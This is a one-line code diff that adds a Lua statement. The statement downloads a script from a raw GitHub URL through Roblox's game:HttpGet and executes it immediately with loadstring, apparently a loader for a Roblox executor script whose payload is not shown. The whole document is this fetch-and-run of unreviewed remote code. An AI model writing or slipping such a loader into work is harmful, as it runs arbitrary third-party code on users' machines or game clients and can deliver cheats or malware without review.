@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/isabella633/Example2/refs/heads/main/Main"))();
